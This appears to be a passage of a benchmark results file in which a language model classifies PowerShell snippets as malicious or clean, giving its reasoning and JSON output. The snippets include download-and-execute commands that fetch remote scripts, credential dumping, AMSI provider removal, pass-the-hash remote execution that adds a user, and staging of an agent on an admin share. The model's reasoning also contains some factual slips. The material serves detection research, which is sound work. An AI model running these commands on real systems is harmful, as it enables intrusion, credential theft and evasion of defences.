+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The script performs remote code download and execution followed by a credential‑dumping routine, matching multiple malicious indicators (downloader, remote execution, credential access)."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Download and execute a script from a remote URL to dump Windows credentials.
+
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1') ; Invoke-WCMDump
+",1592
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0109,Malicious,"We need to produce JSON with required fields: summary, is_malicious, explain, optional evidence, tag. The script is just ""Get-GPPPassword"". That's a built-in PowerShell function from the PowerSploit module (or other). It retrieves GPP stored passwords, which is credential access. It's a legitimate admin tool but can be used maliciously. The script is just a single command. It's suspicious because it accesses stored passwords. So classification: Likely? Since it's clearly credential access. It's malicious if used by attacker. The script itself is just a call; could be benign admin. According to guidelines, if it exhibits credential access, classify as Malicious? The instruction: ""If the script exhibits at least one malicious or offensive PowerShell indicator listed above or other suspicious indicators, classify it as Malicious or Likely."" Since it's a credential access tool, it's suspicious. Might be ""Likely"" because context unknown. I'd choose ""Likely"". Provide evidence: code segment ""Get-GPPPassword"". Tag: CREDENTIAL_ACCESS. Provide explanation. Also maybe OBFUSCATION none. Provide summary: script attempts to retrieve Group Policy Preferences stored passwords. Provide explain: This command extracts credentials from GPP, which is a known credential dumping technique, indicating malicious intent. Provide tag: CREDENTIAL_ACCESS. Return JSON.","{
+  ""summary"": ""The script runs the Get‑GPPPassword cmdlet to extract passwords stored in Group Policy Preferences."",
+  ""evidence"": [
+    {
+      ""code"": ""Get-GPPPassword"",
+      ""code_explain"": ""Invokes the PowerSploit/Get‑GPPPassword function, which reads the XML files used by Group Policy Preferences to store plaintext credentials. Accessing these files is a known credential‑dumping technique used by attackers to harvest domain admin or service account passwords."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The sole command directly extracts stored credentials from the system, which is a classic credential‑access behavior. While the cmdlet can be used by legitimate administrators, its presence in an unknown script strongly indicates malicious intent."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Retrieve Group Policy Preferences passwords.
+
+Get-GPPPassword
+",1494
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0118,Malicious,"We need to produce JSON per schema. The script is a simple Start-BitsTransfer command. This is a legitimate PowerShell cmdlet used for downloading files. Could be used maliciously as downloader. Indicators: remote download. No obfuscation. It's a downloader behavior. Could be malicious if remote source is untrusted. But based on code alone, it's a downloader. Classification: Likely (suspicious) because it's a downloader but not inherently malicious. Provide summary, evidence with code segment, tag ""DOWNLOADER"". Explain. is_malicious: Likely. tag: ""DOWNLOADER"". Provide explain. Provide evidence array. Ensure required fields: summary, is_malicious, explain. evidence optional but we include. Provide JSON.","{
+  ""summary"": ""The script initiates a foreground BITS transfer to download a file from a remote URL to a local path."",
+  ""evidence"": [
+    {
+      ""code"": ""Start-BitsTransfer -Priority foreground -Source ${remote_file} -Destination ${local_file}"",
+      ""code_explain"": ""Uses the built‑in Start-BitsTransfer cmdlet to retrieve a file from a remote location. Downloading external content is a common technique for attackers to fetch additional payloads, making this a downloader behavior."",
+      ""tag"": ""DOWNLOADER""
+    }
+  ],
+  ""explain"": ""The script performs a remote file download via BITS, which is a typical initial step in many malicious infection chains. While the command itself is legitimate, its use to fetch arbitrary remote content without validation is suspicious and aligns with downloader behavior."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Start a foreground BITS transfer from a remote source to a local destination.
+
+Start-BitsTransfer -Priority foreground -Source ${remote_file} -Destination ${local_file}
+",1406
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0120,Malicious,"We need to produce JSON per schema. The script is a simple Remove-Item targeting a registry key for AMSI provider. This is a defense evasion technique: removing AMSI provider to bypass detection. So malicious? Could be legitimate admin removing a provider, but generally removing AMSI provider is suspicious. The script is clearly targeting AMSI registry key, which is a known technique to disable AMSI. So classify as Malicious (defense evasion). Provide evidence: code line, explanation, tag ""DEFENSE_EVASION"". Also maybe ""PERSISTENCE""? No. So summary: script removes AMSI provider registry key to disable AMSI. Provide explanation. Tag overall: ""DEFENSE_EVASION"". Provide is_malicious: ""Malicious"". Provide explain: because it attempts to delete AMSI provider registry key, which is a known technique to bypass AMSI and evade detection. Provide evidence array with one object.
+
+Make sure JSON matches schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (optional? but schema includes tag property but not required). We'll include tag.
+
+Return JSON only.","{
+  ""summary"": ""The script deletes a specific AMSI provider registry key, effectively disabling that AMSI component."",
+  ""evidence"": [
+    {
+      ""code"": ""Remove-Item -Path \""HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\"" -Recurse"",
+      ""code_explain"": ""Uses the Remove-Item cmdlet to delete a registry key under HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers. Deleting an AMSI provider disables its ability to scan PowerShell scripts, which is a known defense‑evasion technique used by attackers to bypass AMSI‑based detection."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The script targets and removes an AMSI provider registry entry, a direct attempt to subvert Windows Antimalware Scan Interface (AMSI) and evade detection of malicious PowerShell code. This behavior is characteristic of offensive tooling."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DEFENSE_EVASION""
+}",,,"# Natural language intent:
+# Remove a specific AMSI provider registry key.
+
+Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse
+",1559
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0130,Malicious,"We need to produce JSON per schema. The script is just ""Invoke-Inveigh -Inspect"". That's a command to run Inveigh tool in inspection mode. Inveigh is a PowerShell tool for LLMNR/NBT-NS spoofing and credential harvesting. Running it in inspection mode likely monitors network traffic for potential attacks, not necessarily malicious. However the presence of Inveigh indicates offensive security tool. The script itself just invokes the function. No obvious malicious behavior, but the tool can be used for credential theft. The script is not inherently malicious; it's a legitimate security testing tool. Classification: Likely? The script is just a command to run a known offensive tool. Could be used maliciously. Since no evidence of malicious behavior beyond invoking tool, we might label as ""Likely"" because it's suspicious but context missing. Tag maybe ""DISCOVERY"" or ""LATERAL_MOVEMENT""? Inveigh does credential harvesting (CREDENTIAL_ACCESS) and network spoofing (LATERAL_MOVEMENT). But the command is just -Inspect, which is a passive mode. So maybe ""DISCOVERY"". We'll produce evidence: code segment ""Invoke-Inveigh -Inspect"". Explanation: Calls Inveigh function, which can perform LLMNR/NBT-NS spoofing and credential capture; -Inspect runs in passive monitoring mode, still can be used for reconnaissance. Tag: DISCOVERY or CREDENTIAL_ACCESS? I'd choose ""DISCOVERY"". Classification: Likely (since tool is offensive). Provide summary. Provide explain. Provide tag: ""DISCOVERY"". Provide is_malicious: ""Likely"". Provide evidence array with one item.
+
+Let's craft JSON.","{
+  ""summary"": ""The script invokes the Inveigh PowerShell tool in inspection mode, which is used for network credential harvesting and LLMNR/NBT-NS spoofing."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Inveigh -Inspect"",
+      ""code_explain"": ""Calls the Inveigh function. Inveigh is a known offensive security tool that can sniff LLMNR/NBT-NS traffic, perform spoofing, and capture NTLM hashes. The -Inspect flag runs it in a passive monitoring mode, still allowing the tool to observe credential‑related network traffic, which is a reconnaissance activity."",
+      ""tag"": ""DISCOVERY""
+    }
+  ],
+  ""explain"": ""Running Inveigh, even in passive inspection mode, is indicative of credential‑access or discovery activity and is typically used by attackers or red‑team operators. The script itself does not contain additional malicious payloads, but the presence of an offensive tool makes the intent suspicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""DISCOVERY""
+}",,,"# Natural language intent:
+# Run the Inveigh tool in inspection mode.
+
+Invoke-Inveigh -Inspect
+",1608
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0131,Malicious,"We need to produce JSON per schema. The script is creating a new Windows service and starting it. This could be legitimate admin task, but also can be used for persistence. No obvious malicious indicators like downloading, obfuscation, etc. However creating a service is a persistence technique. The script uses variables ServiceName and BinaryPath, presumably provided externally. Without context, could be benign admin. According to guidelines, we need to classify. Since it's a persistence technique, but could be legitimate. Likely? The script is suspicious because creating a service can be used maliciously. But no evidence of malicious intent. I'd classify as Likely (suspicious) with tag PERSISTENCE. Provide evidence: New-Service command and Start-Service command. Summarize: script creates and starts a Windows service. Explanation: This can be used for persistence. Provide evidence.
+
+Return JSON with required fields: summary, evidence (array), explain, is_malicious, tag (general category). Tag maybe ""PERSISTENCE"". Provide evidence items with code, code_explain, tag.
+
+Let's craft.","{
+  ""summary"": ""The script creates a new Windows service with a given name and binary path, then starts that service."",
+  ""evidence"": [
+    {
+      ""code"": ""New-Service -Name \""${ServiceName}\"" -BinaryPathName \""${BinaryPath}\"""",
+      ""code_explain"": ""Uses the built‑in New-Service cmdlet to register a Windows service. Creating a service is a common persistence technique because the service can be configured to run automatically at system boot, and it can execute arbitrary binaries with system privileges."",
+      ""tag"": ""PERSISTENCE""
+    },
+    {
+      ""code"": ""Start-Service -Name \""${ServiceName}\"""",
+      ""code_explain"": ""Immediately starts the newly created service. Starting the service ensures the payload (the binary at ${BinaryPath}) runs right away, which is typical of attacker‑controlled service deployment."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script performs actions that are frequently used by attackers to achieve persistence and execute arbitrary code, but the code itself contains no obvious malicious payload, download, or credential‑stealing behavior. Without additional context it is suspicious but not definitively malicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""PERSISTENCE""
+}",,,"# Natural language intent:
+# Create a new Windows service with a specified name and binary path, then start the service.
+
+New-Service -Name ""${ServiceName}"" -BinaryPathName ""${BinaryPath}"" ; Start-Service -Name ""${ServiceName}""
+",1555
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0135,Malicious,"We need to produce JSON per schema. Analyze script.
+
+Script:
+
+$path = ""sandcat.go-windows""; ; $drive = ""\\${remote.host.fqdn}\C$""; ; Copy-Item -v -Path $path -Destination $drive""\Users\Public\s4ndc4t.exe"";
+
+Observations: It copies a file named sandcat.go-windows to remote host's C$ admin share, into Users\Public\s4ndc4t.exe. This is typical lateral movement / remote file copy for deployment of malware (Sandcat is a known Cobalt Strike beacon). This is suspicious: remote file copy to admin share, likely for persistence or execution later. Tag: LATERAL_MOVEMENT, PERSISTENCE maybe, DOWNLOADER? Not a downloader but remote copy.
+
+No obfuscation. So evidence: the Copy-Item command with UNC path.
+
+Classify as Malicious (definitely offensive). Tag maybe ""LATERAL_MOVEMENT"" or ""PERSISTENCE"". Choose primary tag: LATERAL_MOVEMENT.
+
+Provide summary: script copies Sandcat executable to remote system's Public folder via admin share.
+
+Explain: uses UNC admin share to place malicious executable, enabling later execution.
+
+Provide evidence array with code segment and explanation.
+
+Return JSON.","{
+  ""summary"": ""The script copies a file named \""sandcat.go-windows\"" to a remote Windows host’s C$ administrative share, placing it in the Public folder as s4ndc4t.exe."",
+  ""evidence"": [
+    {
+      ""code"": ""Copy-Item -v -Path $path -Destination $drive\""\\Users\\Public\\s4ndc4t.exe\"";"",
+      ""code_explain"": ""Uses PowerShell’s Copy-Item cmdlet to write a file to a UNC path that references the remote host’s C$ admin share (\\\\${remote.host.fqdn}\\C$). Writing a malicious executable to the Public folder on a remote system is a classic lateral‑movement and staging technique, allowing the attacker to later execute the payload on the target."",
+      ""tag"": ""LATERAL_MOVEMENT""
+    }
+  ],
+  ""explain"": ""The script performs a remote file copy of a known malicious payload (Sandcat) to a remote system via an administrative share, which is a clear indicator of offensive activity for lateral movement and potential persistence."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""LATERAL_MOVEMENT""
+}",,,"# Natural language intent:
+# Copy Sandcat executable to a remote system's 'Public' folder on the C drive.
+
+$path = ""sandcat.go-windows""; ; $drive = ""\\${remote.host.fqdn}\C$""; ; Copy-Item -v -Path $path -Destination $drive""\Users\Public\s4ndc4t.exe"";
+",1607
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0141,Clean,"We need to produce JSON per schema. The script is a simple Get-ADUser query with filter for useraccountcontrol flag and format table. No malicious behavior. So classification Clean. Provide summary, evidence empty array, explain why not malicious, is_malicious Clean, tag maybe ""DISCOVERY"" but since Clean maybe no tag? The schema includes optional tag property. Could include ""DISCOVERY"". Provide.
+
+Let's craft.","{
+  ""summary"": ""The script queries Active Directory for user accounts that have the specific UserAccountControl flag 4194304 and displays their names in a table."",
+  ""evidence"": [],
+  ""explain"": ""The code only performs a read‑only AD query and formats the output. It does not contain any remote execution, credential harvesting, persistence, privilege escalation, obfuscation, or other suspicious behavior. Therefore it is benign."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""DISCOVERY""
+}",,,"# Natural language intent:
+# Retrieve Active Directory users with specific account control flags and format the output table.
+
+Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+",1262
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0145,Clean,"We need to produce JSON with required fields: summary, evidence (array), explain, is_malicious, tag (optional? required? In schema, tag not required but can include). Provide classification. The script is a simple command using a custom function Get-BrowserInformation to retrieve IE bookmarks for a user. No malicious indicators. So Clean. Evidence empty array. Tag maybe ""DISCOVERY"" but since clean, tag maybe omitted or null. Provide summary. Provide explain. Provide is_malicious ""Clean"". Provide tag maybe ""DISCOVERY"" but not needed. The schema requires summary, is_malicious, explain. evidence optional. Provide empty array. Provide tag maybe ""DISCOVERY"". But tag field is required? Not in required list. So optional. We'll include tag ""DISCOVERY"" maybe but script is benign. Could set tag ""DISCOVERY"". But classification Clean. Provide.","{
+  ""summary"": ""The script calls a custom cmdlet Get-BrowserInformation to enumerate Internet Explorer bookmarks for the user 'user3'."",
+  ""evidence"": [],
+  ""explain"": ""The command only reads browser bookmark data for a specified user and does not contain any remote execution, credential harvesting, persistence, obfuscation, or other suspicious behavior. No indicators of malicious activity are present."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""DISCOVERY""
+}",,,"# Natural language intent:
+# Retrieve Internet Explorer bookmarks information for a specified user.
+
+Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user3
+",1333
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0146,Malicious,"We need to produce JSON per schema. Summarize, evidence, explain, is_malicious, tag.
+
+Script: IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')
+
+Behavior: downloader, remote code execution, execution, possibly malicious. Evidence: code segment, explanation, tag: DOWNLOADER, EXECUTION, REMOTE_COMMAND_EXECUTION maybe.
+
+Overall classification: Malicious.
+
+Tag: DOWNLOADER or EXECUTION. Choose general category: DOWNLOADER.
+
+Provide summary: script downloads and executes remote PowerShell script from untrusted site.
+
+Explain: malicious because it fetches and runs code from internet without verification.
+
+Provide evidence array with one object.
+
+Return JSON.","{
+  ""summary"": ""The script downloads a PowerShell file from an external HTTP URL and immediately executes it in the current session."",
+  ""evidence"": [
+    {
+      ""code"": ""IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')"",
+      ""code_explain"": ""The command creates a .NET WebClient object, fetches the raw contents of a remote script via HTTP, and pipes it to IEX (Invoke‑Expression), which executes the downloaded code without any validation. This pattern is a classic downloader/back‑door technique used for remote code execution."",
+      ""tag"": ""DOWNLOADER""
+    }
+  ],
+  ""explain"": ""The script performs an unauthenticated download of executable PowerShell code from an untrusted Internet source and runs it directly, which is a clear indicator of malicious behavior."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Download and execute a PowerShell script from a potentially illegal website.
+
+IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')
+",1415
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0150,Clean,"We need to analyze the provided PowerShell content. It's a command: Invoke-EgressCheck -ip 1.2.3.4 -portrange '22-25,53,80,443,445,3306,3389' -protocol ALL -delay 100 -verbose
+
+We need to see if this is malicious. This appears to be a custom function Invoke-EgressCheck that checks egress connectivity to IP and ports. Could be benign network testing. No obvious malicious behavior. No obfuscation, no download, no credential access. It's just a network check. Could be used for reconnaissance but the script itself is just a command. The function name suggests maybe part of a security tool. Without seeing definition, we cannot know if it does something malicious. Based on observable content, it's a benign network connectivity test. So classification: Clean or maybe Likely? The instruction says if at least one malicious indicator, classify as Malicious or Likely. Here none. So Clean.
+
+We need to produce JSON with summary, evidence (empty array), explain, is_malicious, tag (maybe ""DISCOVERY"" if we want but if Clean maybe tag can be omitted? The schema expects tag property but not required. We can include ""DISCOVERY"" as general category but if Clean maybe tag ""DISCOVERY""? The spec: ""tag"": ""Tag classifying the general category of the script if it is malicious"". If Clean, maybe omit or set null. But schema expects string type, not required. So we can omit tag.
+
+Provide summary: ""The script invokes a custom function to test outbound connectivity to a specific IP and a set of ports.""
+
+Explain: ""No malicious indicators such as remote code execution, download, credential access, persistence, etc. It's a network diagnostic command.""
+
+Evidence: empty.
+
+Return JSON.","{
+  ""summary"": ""The script calls a custom function (Invoke‑EgressCheck) to test outbound connectivity to a given IP address and a list of ports with a delay and verbose output."",
+  ""evidence"": [],
+  ""explain"": ""The command only performs network reachability checks. It contains no obfuscation, downloading, credential harvesting, persistence mechanisms, or other typical malicious behaviors. Without the function definition, the observable content is limited to a benign diagnostic operation."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Perform egress network checks to specified IP and port ranges with a delay and verbose output.
+
+Invoke-EgressCheck -ip 1.2.3.4 -portrange '22-25,53,80,443,445,3306,3389' -protocol ALL -delay 100 -verbose
+",1574
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0159,Clean,"We need to produce JSON per schema. The script is just ""get-process"". That's a benign command to retrieve process info. No malicious indicators. So classification: Clean. Provide summary, evidence maybe none. The evidence array can be empty. Explain why not malicious. Tag maybe ""DISCOVERY"" but since clean, tag maybe omitted? Schema requires tag property optional? It is defined but not required. We can include null? Better omit. Provide summary: ""The script lists running processes on the local system."" Provide explain: ""It only calls Get-Process, which is a standard PowerShell cmdlet for enumeration; no suspicious behavior."" is_malicious: ""Clean"". evidence empty array. Provide tag maybe ""DISCOVERY"" but not needed. The schema says tag property is defined but not required. Could include ""DISCOVERY"". But if Clean maybe tag not needed. I'll include tag ""DISCOVERY"". Provide JSON.","{
+  ""summary"": ""The script enumerates all running processes on the local machine using the built‑in Get‑Process cmdlet."",
+  ""evidence"": [],
+  ""explain"": ""Get‑Process is a standard PowerShell command for legitimate system discovery. The script contains no remote calls, credential handling, persistence mechanisms, obfuscation, or any other behavior associated with malicious activity."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""DISCOVERY""
+}",,,"# Natural language intent:
+# Retrieve information about running processes in PowerShell.
+
+get-process
+",1320
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0157,Malicious,"We need to produce JSON per schema. The script: ""Invoke-Expression ${input_file}"". This runs whatever is in variable input_file (presumably a file path). This is a generic execution of arbitrary code; it's potentially malicious because it allows execution of arbitrary PowerShell from a variable, could be used for code injection. However without more context, it's suspicious but not definitively malicious. It's a typical pattern for executing user-provided content, which is dangerous. So classification: Likely malicious (suspicious). Provide summary, evidence: code segment ""Invoke-Expression ${input_file}"" tag: EXECUTION, maybe DEFENSE_EVASION? It's direct execution. Also OBFUSCATION not present. Provide explanation.
+
+Return JSON with required fields: summary, is_malicious, explain, evidence array, tag (general category). Tag maybe ""EXECUTION"". Provide evidence items with code, code_explain, tag.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script executes whatever PowerShell code is contained in the variable `input_file` using `Invoke-Expression`."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Expression ${input_file}"",
+      ""code_explain"": ""`Invoke-Expression` evaluates a string as PowerShell code. Supplying the content of a variable (or file) directly to it allows arbitrary code execution, which is a classic technique for command execution and is often used by malware to run downloaded or staged payloads."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The use of `Invoke-Expression` on uncontrolled input is a high‑risk pattern that enables execution of arbitrary PowerShell code, a common behavior in malicious scripts. While the snippet alone does not show a payload, the technique is inherently suspicious and frequently abused for remote code execution, downloader behavior, or post‑compromise actions."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Execute PowerShell code from the specified input file.
+
+Invoke-Expression ${input_file}
+",1448
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0154,Malicious,"We need to analyze the provided PowerShell content:
+
+```
+# Natural language intent:
+# Execute reflective PowerShell code encoded in SharpGen's format.
+
+Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'
+```
+
+We need to produce JSON with summary, evidence array, explain, is_malicious, tag.
+
+We need to identify suspicious behavior: Invoke-SSharp is likely a custom function that loads and executes reflective code. The source string is base64: decode it.
+
+Let's decode base64: ""Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7""
+
+Base64 decode: Let's decode manually. Using known base64 decode: ""Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7""
+
+Break: Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7
+
+Decode: ""Console.WriteLine(\""Testing S#!\"") ;""? Let's decode.
+
+Base64 decode: Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7
+
+I think it's ""Console.WriteLine(\""Testing S#!\"") ;"". Let's verify: ""Console.WriteLine(\""Testing S#!\"") ;"" in ASCII base64: Let's compute quickly: ""Console.WriteLine(\""Testing S#!\"") ;"" -> bytes: C o n s o l e . W r i t e L i n e ( "" T e s t i n g   S # ! "" ) ; . Let's use known base64: ""Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7"". Yes that matches.
+
+So the script is invoking a function that likely loads .NET assembly code (SharpGen) to execute reflective code. This is typical of offensive tools (SharpGen, reflective loader). The code is base64-encoded .NET code that writes to console. Could be benign demonstration, but the use of reflective execution is suspicious.
+
+We need to tag: OBFUSCATION (base64), EXECUTION (reflective), possibly DEFENSE_EVASION (reflective loading bypasses detection). Also DOWNLOADER? Not present.
+
+Thus classification: Likely malicious? Since it's just printing ""Testing S#!"" maybe a test. But the presence of Invoke-SSharp (custom) suggests malicious tool. Without more context, we may label Likely.
+
+Provide evidence: code segment: Invoke-SSharp -source '...'
+
+Explain: Use of custom function to load base64-encoded .NET code, reflective execution.
+
+Tag: OBFUSCATION, EXECUTION, DEFENSE_EVASION.
+
+Now produce JSON.
+
+","{
+  ""summary"": ""The script calls a custom function (Invoke‑SSharp) to load and execute a Base64‑encoded .NET payload (SharpGen reflective code)."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"",
+      ""code_explain"": ""The command invokes a non‑standard PowerShell function (Invoke‑SSharp) that is typically used to load and execute reflective .NET assemblies. The payload is supplied as a Base64 string, which decodes to `Console.WriteLine(\""Testing S#!\"");`. Supplying code in Base64 is a classic obfuscation technique that hides the actual commands from casual inspection and can be used to bypass simple string‑based detections. Reflective loading executes code in memory without writing a file to disk, a known defense‑evasion method."",
+      ""tag"": ""OBFUSCATION""
+    },
+    {
+      ""code"": ""Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"",
+      ""code_explain"": ""The function likely performs in‑memory compilation or loading of the decoded .NET snippet, resulting in immediate execution (EXECUTION). Reflective execution is frequently employed by offensive tools to run malicious payloads while avoiding traditional AV file‑based detection."",
+      ""tag"": ""EXECUTION""
+    },
+    {
+      ""code"": ""Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"",
+      ""code_explain"": ""By using a custom loader rather than standard PowerShell cmdlets (e.g., Add-Type, Invoke-Expression), the script attempts to evade built‑in logging and AMSI scanning, which classifies it as DEFENSE_EVASION."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The script employs a custom reflective loader with a Base64‑encoded payload, a pattern commonly seen in offensive PowerShell toolkits. While the decoded payload only prints a test string, the technique itself (in‑memory reflective execution with obfuscation) is indicative of malicious behavior, so the script is considered suspicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""OBFUSCATION""
+}",,,"# Natural language intent:
+# Execute reflective PowerShell code encoded in SharpGen's format.
+
+Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'
+",2228
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0161,Malicious,"We need to produce JSON per schema. Summarize: script attempts remote command execution via SMBExec with credentials. Identify evidence: the Invoke-SMBExec command with target, domain, username, hash. Tag: REMOTE_COMMAND_EXECUTION, CREDENTIAL_ACCESS maybe. Also possibly PRIVILEGE_ESCALATION? Not necessarily. It's malicious likely. Provide explanation. Determine is_malicious: Likely or Malicious? Using SMBExec with hash suggests credential use and remote execution, typical offensive. Could be legitimate admin tool, but context suggests malicious. I'd classify Likely? The instruction says if at least one malicious indicator, classify as Malicious or Likely. Since it's clearly remote command execution with stolen hash, I'd go Malicious. Provide tag: REMOTE_COMMAND_EXECUTION. Provide evidence array with one item.
+
+Return JSON with required fields: summary, evidence, explain, is_malicious, tag (optional if malicious). Tag field: maybe ""REMOTE_COMMAND_EXECUTION"". Provide.
+
+Let's craft.","{
+  ""summary"": ""The script uses the Invoke‑SMBExec function to run commands on a remote host (192.168.100.20) by providing domain, username, and an NTLM hash."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0"",
+      ""code_explain"": ""Invoke‑SMBExec is a PowerShell implementation of the SMBExec technique, which authenticates to a remote Windows host using supplied credentials (including an NTLM hash) and spawns a process under the context of that account. Supplying a clear‑text hash and targeting an internal IP address is a classic indicator of credential‑based remote command execution, often used by attackers for lateral movement."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""-Hash F6F38B793DB6A94BA04A52F1D3EE92F0"",
+      ""code_explain"": ""Passing an NTLM hash directly enables pass‑the‑hash style authentication, which is a credential‑access and privilege‑escalation technique. The presence of a raw hash in script text is a strong sign of offensive use."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The script performs credential‑based remote command execution against a target machine, a behavior that aligns with lateral movement and post‑compromise activity. The explicit use of a password hash further indicates malicious intent."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Attempts to execute commands on a remote system using SMBExec with specified credentials.
+
+Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
+",1657
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0169,Malicious,"We need to produce JSON per schema. Summarize: script attempts to add new user via Invoke-SMBExec remote execution. Identify evidence: the Invoke-SMBExec command with remote target, domain, username, hash, and net user command. Tags: REMOTE_COMMAND_EXECUTION, CREDENTIAL_ACCESS (hash), PERSISTENCE (adding user), PRIVILEGE_ESCALATION maybe. Provide explanation. Determine is_malicious: likely malicious because adding user on remote system without authorization. So ""Malicious"". Tag general category: ""PERSISTENCE"" or ""PRIVILEGE_ESCALATION"". Probably ""PERSISTENCE"". Provide evidence array with code, explanation, tag.
+
+Return JSON with required fields: summary, evidence, explain, is_malicious, tag. Ensure additionalProperties false. Provide required fields. Let's craft.
+
+","{
+  ""summary"": ""The script uses Invoke‑SMBExec to execute a remote command that creates a new local user (SMBExec) with a known password on the target machine."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'net user SMBExec Winter2017 /add'"",
+      ""code_explain"": ""Invoke‑SMBExec leverages SMB authentication (pass‑the‑hash) to run arbitrary commands on a remote Windows host. Supplying a NTLM hash (-Hash) is a credential‑access technique. The embedded command `net user SMBExec Winter2017 /add` creates a new local account, which provides persistence and can be used for privilege escalation or lateral movement."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""-Hash F6F38B793DB6A94BA04A52F1D3EE92F0"",
+      ""code_explain"": ""Passing a clear‑text NTLM hash enables pass‑the‑hash authentication, a credential‑access method that bypasses normal password verification."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    },
+    {
+      ""code"": ""'net user SMBExec Winter2017 /add'"",
